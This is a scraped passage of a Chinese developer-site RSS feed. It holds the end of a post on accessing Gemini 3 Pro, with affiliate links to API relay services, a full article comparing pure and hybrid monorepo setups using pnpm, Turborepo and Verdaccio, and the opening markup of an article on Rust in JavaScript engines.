<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a635a4cdc7b1497684b018e93f75e32f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=4T6RleFCx5gUi%2Ft7wW8HcOvxyxk%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-30">优势</h3>
<ul>
<li>国内可用</li>
<li>提供Gemini 3 Pro付费和免费模型</li>
<li>提供所有主流模型</li>
</ul>
<h3 data-id="heading-31">限制</h3>
<ul>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-32">使用</h3>
<p>在ZenMux首页选择【Gemini 3 Pro Preview Free】模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb70f2dd7f7e41bd8848cf156fabc185~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=voNPPAe22UFaPM0AMqSJQD8WFJ4%3D" alt="图片" loading="lazy"/></p>
<p>输入提示词，复刻的bilibili官网首页效果如下:</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f043d908b494c9fa5d80e0a3ee24c15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=%2FeBzY2eYlABMKDAa5enEYBWl1%2FQ%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e52a62e2449b4c08b4ffc5d97afaa4a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=5ktiwE7iDcUKeG%2BNMyZqY2Gc%2FEk%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-33">中转站</h2>
<p>以上平台对国内使用都不是很友好，解决不了网络问题的小伙伴可以考虑使用国内中转站，很多中转站已经接入Gemini 3 Pro模型了。对中转站感兴趣的小伙伴也可以看往期内容：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247493035%26idx%3D1%26sn%3D9ccc174a34a0ee59e6a609e409b09908%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247493035&amp;idx=1&amp;sn=9ccc174a34a0ee59e6a609e409b09908&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Claude Code CLI平台与中转站接入汇总及避坑</a></p>
<p>这里友情提供两个比较稳定的（非广告，我只想要个邀请奖励😁）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8998bdffa12498d9e7a7b6141fd9281~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=YmZ%2FI5ZuQ4rp%2F5kagMnjWv1uLDM%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-34">优势</h3>
<ul>
<li>国内可用</li>
<li>可联系站主获取体验额度</li>
</ul>
<h3 data-id="heading-35">限制</h3>
<ul>
<li>付费使用</li>
</ul>
<h3 data-id="heading-36">PackyCode</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e72f1b699b942afbcff367ab3cdda51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=8NXFRxm7jwwX9fUXn%2FgiZDJTpHw%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20aa22c35fea4bb8bfba9154de91d593~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=NY9pvjLi0IZHOaNkaDWWoLjY7ZQ%3D" alt="图片" loading="lazy"/></p>
<p>邀请链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.packyapi.com%2Fregister%3Faff%3DzLOw" target="_blank" title="https://www.packyapi.com/register?aff=zLOw" ref="nofollow noopener noreferrer">www.packyapi.com/register?af…</a></p>
<h3 data-id="heading-37">IKunCode</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ddd27b7ec06485c91443bf067ced516~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=y%2BFBPrcQadARlfYFJod96Q7QIy4%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c78e709e5a34528855ac427254057be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=FxiM6XSh8T9QYQFIjtSlsSTN%2B0s%3D" alt="图片" loading="lazy"/></p>
<p>邀请链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.ikuncode.cc%2Fregister%3Faff%3DkD2Q" target="_blank" title="https://api.ikuncode.cc/register?aff=kD2Q" ref="nofollow noopener noreferrer">api.ikuncode.cc/register?af…</a></p>
<h2 data-id="heading-38">友情提示</h2>
<p>见原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhiV51BPYiS5YQZS02esPoA" target="_blank" title="https://mp.weixin.qq.com/s/hiV51BPYiS5YQZS02esPoA" ref="nofollow noopener noreferrer">体验Gemini 3 Pro的N多种方式</a></p>
<blockquote>
<p>本文同步自微信公众号 "<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhiV51BPYiS5YQZS02esPoA" target="_blank" title="https://mp.weixin.qq.com/s/hiV51BPYiS5YQZS02esPoA" ref="nofollow noopener noreferrer">程序员小溪</a>" ，这里只是同步，想看及时消息请移步我的公众号，不定时更新我的学习经验。友情提示友情提示</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[纯Monorepo vs 混合式Monorepo]]></title>    <link>https://juejin.cn/post/7575655132747907108</link>    <guid>https://juejin.cn/post/7575655132747907108</guid>    <pubDate>2025-11-23T03:00:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132747907108" data-draft-id="7575159361904279593" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="纯Monorepo vs 混合式Monorepo"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2025-11-23T03:00:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="欧阳的棉花糖"/> <meta itemprop="url" content="https://juejin.cn/user/958429872784541"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            纯Monorepo vs 混合式Monorepo
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/958429872784541/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    欧阳的棉花糖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:00:43.000Z" title="Sun Nov 23 2025 03:00:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、开篇：用生活场景理解两种模式</h3>
<p>如果要同时管理 “个人博客”“通用工具库”“公司业务系统” 三个项目，两种模式给出了不同的 “管理方案”——</p>
<h4 data-id="heading-1">纯 Monorepo：“一家人住同一套大公寓”</h4>
<p>所有项目都放进<strong>一个 Git 仓库</strong>（相当于一套大公寓），共用 “水电燃气”（工程化配置，如 ESLint、构建工具）和 “家具家电”（依赖包，如 React、Vue）。改工具库的代码，博客项目立刻能用上，不用 “搬东西”（发版、升级）。</p>
<h4 data-id="heading-2">混合式 Monorepo：“邻居住同一小区，共用健身房 + 偶尔串门借东西”</h4>
<p>每个项目还是<strong>独立的 Git 仓库</strong>（相当于小区里的不同住户），但都放进同一个文件夹（如 <code>apps/</code>，相当于小区），共用 “公共设施”（pnpm 依赖缓存、turbo 构建加速）；遇到需要改工具库的情况，能临时 “串门借东西”（本地关联公共库代码），改完后再 “归位”（公共库发版、业务项目升级）。</p>
<h3 data-id="heading-3">二、核心对比：8 个维度讲透差异</h3>


















































<table><thead><tr><th>对比维度</th><th>纯 Monorepo</th><th>混合式 Monorepo</th></tr></thead><tbody><tr><td><strong>1. 仓库结构</strong></td><td>1 个 Git 仓库，所有项目是仓库内的子目录（如 <code>packages/工具库</code>、<code>apps/博客</code>）</td><td>N 个独立 Git 仓库，放在同一目录下（如 <code>apps/博客</code> 内有自己的 <code>.git</code> 文件夹）</td></tr><tr><td><strong>2. 项目联动</strong></td><td>改公共库后，业务项目实时生效，1 次提交同步所有变更</td><td>日常：公共库发版 + 业务项目升级；特殊场景：本地关联公共库，改完后分别提交</td></tr><tr><td><strong>3. 依赖管理</strong></td><td>全仓库依赖统一在根目录 <code>package.json</code> 管理，子项目直接引用本地目录</td><td>日常：各项目独立 <code>package.json</code>，共用 pnpm 缓存；特殊场景：<code>pnpm link</code> 本地关联公共库</td></tr><tr><td><strong>4. 准备工作</strong></td><td>需配置 “工作区”（如 pnpm workspaces），指定子项目目录</td><td>零配置门槛：克隆独立仓库到同一文件夹，特殊场景加 <code>pnpm link</code> 即可</td></tr><tr><td><strong>5. 典型工具</strong></td><td>工作区工具：pnpm workspaces、Lerna、Turborepo（全仓库构建）</td><td>缓存工具 + 关联工具：pnpm（缓存 + link）、turbo（单项目加速）、Verdaccio（私有包仓库）</td></tr><tr><td><strong>6. 版本控制</strong></td><td>所有项目共用一套版本记录，工具库升级 = 仓库整体提交</td><td>每个项目独立版本，公共库版本和业务项目版本分开管理</td></tr><tr><td><strong>7. 团队协作</strong></td><td>适合 “全栈式协作”：同一批人既改业务又维护工具库</td><td>适合 “分工 + 灵活协作”：基建组管公共库，业务组管项目，特殊场景临时联动</td></tr><tr><td><strong>8. 迁移成本</strong></td><td>需合并多个独立仓库代码，整理历史提交</td><td>直接把现有仓库放进同一目录，特殊场景加本地关联配置</td></tr></tbody></table>
<h3 data-id="heading-4">三、关键场景：什么时候需要高频联动？</h3>
<p>虽然大部分时候公共库很稳定，但以下 4 种情况，纯 Monorepo 的 “一键联动” 会更高效：</p>
<ol>
<li>
<p><strong>小团队 / 初创团队</strong>：没人专职维护公共库，开发博客时发现工具库缺功能，得自己改工具库再同步业务；</p>
</li>
<li>
<p><strong>公共库重大更新</strong>：比如组件库从 Vue2 升到 Vue3，业务项目要跟着改引用方式，天天需要联调；</p>
</li>
<li>
<p><strong>业务专属公共库</strong>：比如电商团队的 “订单工具库”，只服务订单业务，业务改需求就得同步改工具库；</p>
</li>
<li>
<p><strong>ToB 定制需求</strong>：客户要在报表页加特殊筛选，得改公共表格组件，再同步到业务项目，周期短要求快。</p>
</li>
</ol>
<p>而混合式 Monorepo 能兼顾：日常用 “独立仓库 + 发版” 保证稳定，遇到以上场景用 “本地关联” 临时联动，不用强行合并仓库。</p>
<h3 data-id="heading-5">四、实际操作：两种模式怎么用？</h3>
<h4 data-id="heading-6">案例 1：新增 “日历组件库”</h4>
<ul>
<li><strong>纯 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>根仓库新建 <code>packages/日历组件</code>；</p>
</li>
<li>
<p>博客项目直接引用 <code>import 日历 from '@我的仓库/日历组件'</code>；</p>
</li>
<li>
<p>一次提交：<code>git commit -m "新增日历组件+博客接入"</code>。</p>
</li>
</ol>
<ul>
<li><strong>混合式 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>单独建 “日历组件” 仓库，开发完发私有 npm 包（用 Verdaccio）；</p>
</li>
<li>
<p>博客项目执行 <code>pnpm install @我的账号/日历组件</code>；</p>
</li>
<li>
<p>两次提交：先提交组件库，再提交博客项目。</p>
</li>
</ol>
<h4 data-id="heading-7">案例 2：修复工具库 bug（高频联动场景）</h4>
<ul>
<li><strong>纯 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>改 <code>packages/工具库</code> 的 bug；</p>
</li>
<li>
<p>切换到博客项目验证；</p>
</li>
<li>
<p>一次提交搞定。</p>
</li>
</ol>
<ul>
<li><strong>混合式 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>日常：改工具库→发版 v1.0.1→博客项目 <code>pnpm update</code>→提交；</p>
</li>
<li>
<p>紧急联动：用 <code>pnpm link ../工具库</code> 本地关联→改完工具库直接验证→工具库发版 + 博客项目升级→分别提交。</p>
</li>
</ol>
<h3 data-id="heading-8">四、工具选型：两种模式的 “好搭档”</h3>
<h4 data-id="heading-9">纯 Monorepo 必备工具</h4>

























<table><thead><tr><th>工具名称</th><th>作用</th><th>简单用法</th></tr></thead><tbody><tr><td>pnpm workspaces</td><td>管理全仓库依赖和子项目目录</td><td>根目录写 <code>packages: ['packages/*', 'apps/*']</code></td></tr><tr><td>Turborepo</td><td>全仓库增量构建，一次启动所有项目</td><td><code>turbo run dev</code> 根目录执行</td></tr><tr><td>Lerna</td><td>批量给子项目发版</td><td><code>lerna publish</code> 一键升版本</td></tr></tbody></table>
<h4 data-id="heading-10">混合式 Monorepo 常用工具</h4>

























<table><thead><tr><th>工具名称</th><th>作用</th><th>简单用法</th></tr></thead><tbody><tr><td>pnpm</td><td>依赖缓存 + 本地关联公共库</td><td><code>pnpm link ../工具库</code> 关联；<code>pnpm install</code> 用缓存</td></tr><tr><td>Verdaccio</td><td>搭私有 npm 仓库，存公共库包</td><td>启动后 <code>npm publish --registry 本地地址</code></td></tr><tr><td>turbo</td><td>加速单个项目构建启动</td><td>进入博客目录 <code>turbo dev</code></td></tr></tbody></table>
<h3 data-id="heading-11">五、常见问题解答</h3>
<h4 data-id="heading-12">Q1：纯 Monorepo 仓库会越来越大吗？</h4>
<p>不会！根目录 <code>.gitignore</code> 排除 <code>node_modules/</code>（依赖不进仓库）、<code>dist/</code>（构建产物不进仓库），大文件用 Git LFS 存，体积可控。</p>
<h4 data-id="heading-13">Q2：混合式 Monorepo 能复用工具库代码吗？</h4>
<p>当然！日常用私有 npm 包（Verdaccio）安装引用，紧急情况用 <code>pnpm link</code> 本地关联，两种方式都能复用。</p>
<h4 data-id="heading-14">Q3：团队变大后能切换模式吗？</h4>
<ul>
<li>
<p>混合式→纯 Monorepo：把所有仓库代码合并到一个新仓库，配好工作区即可；</p>
</li>
<li>
<p>纯 Monorepo→混合式：拆分需要独立的项目，初始化新仓库发私有包，其他项目安装引用。</p>
</li>
</ul>
<h3 data-id="heading-15">六、选型指南：3 步选对模式</h3>
<h4 data-id="heading-16">第一步：看 “联动频率”</h4>
<ul>
<li>
<p>每周都要改公共库 + 业务代码→纯 Monorepo；</p>
</li>
<li>
<p>半年改一次公共库，日常只开发业务→混合式 Monorepo。</p>
</li>
</ul>
<h4 data-id="heading-17">第二步：看 “团队分工”</h4>
<ul>
<li>
<p>3-5 人小团队，一人多岗→纯 Monorepo；</p>
</li>
<li>
<p>10 人以上，基建组和业务组分工明确→混合式 Monorepo。</p>
</li>
</ul>
<h4 data-id="heading-18">第三步：看 “灵活度需求”</h4>
<ul>
<li>
<p>想少配置，快速启动→混合式 Monorepo（克隆仓库就能用）；</p>
</li>
<li>
<p>愿意花 10 分钟配工作区，换长期高效→纯 Monorepo。</p>
</li>
</ul>
<h3 data-id="heading-19">七、总结：没有 “最优”，只有 “适配”</h3>
<ul>
<li>
<p>纯 Monorepo 是 “高效联动派”：适合高频改公共库、小团队协作，用 “一次提交” 省时间；</p>
</li>
<li>
<p>混合式 Monorepo 是 “稳定灵活派”：适合分工明确、公共库稳定的场景，日常稳定 + 紧急联动两不误。</p>
</li>
</ul>
<p>不用纠结 “必须选哪种”，小团队可以先从纯 Monorepo 起步，团队变大分工明确后，过渡到混合式；也可以直接用混合式，兼顾稳定和灵活 —— 核心是让模式适配你的开发节奏～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS 引擎赛道中的 Rust 角色]]></title>    <link>https://juejin.cn/post/7575102474639736883</link>    <guid>https://juejin.cn/post/7575102474639736883</guid>    <pubDate>2025-11-23T03:10:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102474639736883" data-draft-id="7575133880435654707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS 引擎赛道中的 Rust 角色"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-23T03:10:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yanni4Night"/> <meta itemprop="url" content="https://juejin.cn/user/4089838983724520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS 引擎赛道中的 Rust 角色
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4089838983724520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yanni4Night
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:10:51.000Z" title="Sun Nov 23 2025 03:10:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 